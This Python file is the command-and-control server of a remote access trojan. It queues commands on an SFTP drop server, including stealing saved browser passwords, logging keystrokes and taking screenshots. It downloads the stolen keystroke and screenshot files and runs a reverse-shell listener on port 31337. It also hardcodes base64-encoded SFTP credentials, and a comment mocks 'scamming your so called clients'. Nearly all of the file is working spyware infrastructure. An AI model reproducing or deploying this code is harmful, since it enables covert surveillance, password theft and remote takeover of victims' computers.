#This file shall implement the command and control server for the client
#it will connect to an FTP server and edit a file called "commands.txt". The client will read this file and execute the commands! 
#no other (direct) connection should be built up between client and server (only if strictly requested).
#The Server should also be able to recieve the reverse shell from the client, he does this by getting the clients ip from the sftp server and opening up a port for it.

#Imports
import os
import socket
from ctypes import *
import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
import sqlite3, shutil, win32crypt, win32process, sys, random, pygame, time
from sys import gettrace as sys_gettrace
from tkinter import *
import pysftp, base64
from _thread import *

#Global Variables
host_sftp = "192.168.178.87"
username_sftp = "ZGVza3RvcC00N2V0YWQyXG1hbnVlbA=="
password_sftp = "VGVubmlzMTIh"

#Functions
#------------------------Connection to FTPS server------------------------
def ftps_connect():
    cnopts = pysftp.CnOpts()
    cnopts.hostkeys = None
    ftps = pysftp.Connection(host=host_sftp, username=base64.b64decode(username_sftp), password=base64.b64decode(password_sftp), cnopts=cnopts)       #change this to your own SFTP server!
    return ftps

def ftps_upload_file(ftps, file):
    try:
        ftps.put(file, preserve_mtime=True)
    except:
        print("Error uploading file")

def ftps_download_file(ftps, file):
    try:
        ftps.get(file, open(file, 'wb').write)
    except: 
        print("File not found")

def ftps_create_dir(ftps, dir):
    try:
        ftps.mkdir(str(dir))
        ftps.chdir(str(dir))
    except:
        print("Directory exists already")

def ftps_check_dir(ftps, dir):
    try:
        ftps_create_dir(ftps, dir)
        ftps.chdir(dir)
        return True
    except:
        print("Directory creation failed!")
        return False

#get all new directories from the ftp server
def get_new_dirs(ftps, count):
    if count != 0:
        ftps.chdir("..")
    captured_dirs = []
    dirs = ftps.listdir()
    print(dirs)
    #find all dirs with "0!?%" in name
    for dir in dirs:
        if "0_0_2" in dir:
            captured_dirs.append(dir)
    
    print(captured_dirs)
    #download all files from the captured_dirs
    print("Here 1")
    for dir in captured_dirs:
        try:
            os.mkdir(dir)
        except:
            print("[-] Remote directory couldn't be created locally!")
        finally:
            ftps.get_r(dir, '', preserve_mtime=True)
            os.chdir("keystrokes")
            ftps.chdir("keystrokes")
            ftps.get("keystrokes.txt", preserve_mtime=True)
            ftps.chdir("..")
            os.chdir("..")
            os.chdir("screenshots")
            ftps.chdir("screenshots")
            ftps.get("screenshot1.png", preserve_mtime=True)
            ftps.chdir("..")

    
    #ftps.chdir(captured_dirs[0])
    #with open("keylogger.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
    #    text = f.read()
    #    text = base64.b64decode(text)
    #    #write decoded text to file 
    #    f.write(text)
    #print("[+] The Keylogger.txt file is base64 encoded but should be decoded now!")
#------------------------END Connection to FTPS server------------------------


#------------------------Endpoint for reverse shell (netcat listener)------------------------
def reverse_shell():
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 31337
    BUFFER_SIZE = 1024

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    
    # make the PORT reusable
    # when you run the server multiple times in Linux, Address already in use error will raise
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
    print("[+] cd and cd.. commands are disabled for this shell! PWD and DIR should work (nothing else implemented, as not working and task was only to get a reverse shell!")
    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

    while True:
        command = input("Shell> ")
        if "cd" in command:
            continue
        else:
            client_socket.send(command.encode())
            if command.lower() == "exit":
                break
            results = client_socket.recv(BUFFER_SIZE).decode()
            print(results)
    client_socket.close()
    s.close()
    print("[+] Client will also close the connection and continue with ftps command reception, but will take it 10s to do so!")
#------------------------END Reverse Shell------------------------


#------------------------Create command file (write the commands to file from user input throughout console------------------------
def create_command_file(ftps):
    count = 0
    shell = 0
    #take input from user
    while True:
        hekk = 0
        file = open("commands.txt", "w")
        print("[+] Welcome to the interactive command shell!")
        print("[+] Please enter a command to execute on the client!")
        print("[+] The commands will be executed via SFTP commands.txt file!")
        print("[+] You can also spawn a reverse shell from here by typing 'reverse_shell'")
        print("[+] Type help for a list of commands! (exit to exit)")
        command = input("Enter command: ")
        if (command == "help"):
            print("[+] The following commands are available:")
            print("[+] reverse_shell: opens up an interactive reverse shell on the client. Be careful, this will be a direct connection to the client!")
            print("[+] get passwords: gets all the stored passwords from firefox and chrome (at least tries to) and sends them to the sftp server in keylogger.txt. Can be downloaded by get files command!")
            print("[+] get files: gets all the files from the sftp server and downloads them to the current directory!")
            print("[+] get keylogger: gets the keylogger information of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get screenshot: takes a screenshot of the clients screen and sends it to the sftp server. Can be downloaded by get files command!")
            print("------------------------Only the above are working at the moment!------------------------")
            print("[+] get clipboard: gets the clipboard content of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get webcam: gets the webcam content of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get microphone: gets the microphone content of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get system info: gets the system information of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] get process: gets the process information of the client and sends it to the sftp server. Can be downloaded by get files command!")
            print("[+] exit = exit")
            hekk = 1
            count = 1
        elif (command == "reverse_shell"):
            file.write("reverse_shell ")
            #server ip:
            server_ip = socket.gethostbyname(socket.gethostname())
            file.write(str(server_ip))
            shell = 1
        elif (command == "get passwords"):
            file.write("get passwords")
        elif (command == "get files"):
            get_new_dirs(ftps, count)
        elif (command == "get screenshot"):
            file.write("get screenshot")
        elif (command == "get keylogger"):
            file.write("get keylogger")
        elif (command == "get clipboard"):
            file.write("get clipboard")
        elif (command == "get webcam"):
            file.write("get webcam")
        elif (command == "get microphone"):
            file.write("get microphone")
        elif (command == "get system info"):
            file.write("get system info")
        elif (command == "exit"):
            sys.exit()

        if (hekk == 0):
            os.system('cls' if os.name == 'nt' else 'clear')
            file.flush()
            file.close()
            print("[+] Command written to file: " + str(command) + " ! As the client only gets them periodically (every 30 seconds) it might take a while until the command is executed!")
        
        #upload file to ftps server
        if count == 0:
            captured_dirs = []
            dirs = ftps.listdir()
            #find all dirs with "0!?%" in name
            for dir in dirs:
                if "0_0_2" in dir:
                    captured_dirs.append(dir)
        
            #uplpad file to all captured dirs
            for dir in captured_dirs:
                try:
                    ftps.chdir(dir)
                except:
                    print("Error uploading Commands file")
                finally:
                    ftps.put("commands.txt")
            if len(captured_dirs) == 0:
                count = 0
            else:
                count = 1
                print("[+] No clients connected so nothing to upload to! Maybe your not creative enough scamming your so called clients?")
        elif (hekk == 0):
            ftps.delete("commands.txt")
        
        #to make sure it gets put for now
        ftps.put("commands.txt")

        if shell == 1:
            reverse_shell()
            shell = 0

        if (hekk == 0):
            #show countdown on console
            print("[+] This console will sleep now during upload/download time from client. Please be patient!")
            time.sleep(2)
            #remove commands.txt file
            os.remove("commands.txt")
            if hekk == 0:
                for i in range(30, 0, -1):
                    print("[+] " + str(i) + " seconds left until next command!")
                    time.sleep(1)
                    os.system('cls' if os.name == 'nt' else 'clear')
            else: 
                continue
        hekk = 0
        shell = 0
        count = 0

#------------------------Command and Control Server Main------------------------
#Test all of the above functions:
def main():
    while True:
        try:
            ftps = ftps_connect() #for ipv4 connection test
            print("Connected to FTPS server! Debugging purpose, delete later!!")
            create_command_file(ftps)
        except:
            time.sleep(20)
            print("Connection to FTPS server failed! Trying again in 20 seconds!")
        

#------------------------END Command and Control Server Main------------------------



if __name__ == "__main__":
    main()
